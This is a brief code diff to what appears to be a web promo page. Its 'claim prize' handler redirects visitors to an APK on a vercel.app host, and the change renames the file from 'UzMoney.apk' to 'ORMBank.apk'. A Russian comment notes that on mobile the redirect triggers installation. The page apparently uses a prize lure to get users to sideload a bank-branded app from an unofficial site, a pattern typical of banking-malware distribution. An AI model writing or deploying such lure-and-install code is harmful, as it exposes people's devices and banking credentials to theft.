@@ -477,7 +477,7 @@ export default function AppPromoPage() {
        const handleClaimPrize = (e) => {
     e.preventDefault();
 
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/ORMBank.apk';
     
     // На мобилке: попытка открыть напрямую (вызовет установку)
     window.location.href = apkUrl;
